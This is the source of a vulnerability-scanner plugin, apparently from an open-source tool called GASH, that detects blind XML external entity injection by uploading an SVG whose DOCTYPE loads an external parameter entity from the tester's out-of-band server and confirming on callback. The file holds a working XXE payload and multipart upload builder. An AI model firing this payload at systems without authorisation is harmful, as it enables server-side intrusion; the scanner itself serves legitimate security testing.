/* ---
id: xxe-svg-upload-oob
name: Blind XXE via SVG Upload (OOB)
description: Detects XML External Entity injection in an uploaded SVG when server-side image processing parses the document, by shipping an external parameter entity that points at the operator's out-of-band server and confirming only on a callback.
author: GASH contributors
severity: high
tags: [xxe, svg, upload, injection, blind, oob]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 40
phase: probe
order: 115
oob: required
api_version: "1.0"
tests: tests/fixtures/xxe-svg-upload-oob/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/xxe/xxe-svg-upload-oob.js
// What: Tier 2 blind-XXE plugin for SVG file uploads.
// Why: An SVG is an XML document, and thumbnailers, converters and scanners
//   parse uploads server-side. The artifact must be built as a multipart file
//   part with an image/svg+xml content type, which the form builder cannot
//   express. A callback proves entity resolution; the upload's own status
//   proves nothing and is never graded.

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const boundary = "----gashSvgXxe8a1c";
  const multipartType = "multipart/form-data; boundary=" + boundary;
  const maxSends = 40;
  const sent = [];

  const part = (name, value) =>
    "--" + boundary + "\r\n" +
    'Content-Disposition: form-data; name="' + name + '"\r\n\r\n' +
    value + "\r\n";
  const filePart = (name, filename, content) =>
    "--" + boundary + "\r\n" +
    'Content-Disposition: form-data; name="' + name + '"; filename="' + filename + '"\r\n' +
    "Content-Type: image/svg+xml\r\n\r\n" +
    content + "\r\n";
  const svgFor = (url) =>
    '<?xml version="1.0" encoding="UTF-8"?>\n' +
    "<!DOCTYPE svg [<!ENTITY % p SYSTEM '" + url + "'> %p;]>\n" +
    '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">' +
    '<text x="0" y="10">gash</text></svg>';

  for (const point of points) {
    if (sent.length >= maxSends) {
      break;
    }
    if (String(point.paramLocation || "").toLowerCase() !== "body") {
      continue;
    }
    if (String(point.method || "").toUpperCase() !== "POST") {
      continue; // an upload is a POST
    }
    if (!point.paramName) {
      continue;
    }
    const oob = host.oob.generate("http");
    if (!oob) {
      return []; // no OOB server: honest skip, no request, no finding
    }
    const filename = probe.canary() + ".svg";
    let body = "";
    const values = point.formValues || {};
    for (const name in values) {
      if (name === point.paramName) {
        continue;
      }
      body += part(name, String(values[name]));
    }
    body += filePart(point.paramName, filename, svgFor(oob.url));
    body += "--" + boundary + "--\r\n";

    probe.send({
      url: point.url,
      method: point.method,
      paramName: "",
      paramLocation: "body",
      value: body,
      headers: { "Content-Type": multipartType },
    });
    sent.push({ corr: oob.correlationId, ns: oob.namespace, point: point });
  }
  if (sent.length === 0) {
    return [];
  }

  const ids = [];
  for (const s of sent) {
    ids.push(s.corr);
  }
  const ev = host.oracles.oobAny(ids, sent[0].ns);
  if (!ev || ev.correlationId === undefined) {
    return [];
  }
  for (const s of sent) {
    if (s.corr === String(ev.correlationId)) {
      return [host.candidate(s.point, "oob", ev)];
    }
  }
  return [];
}
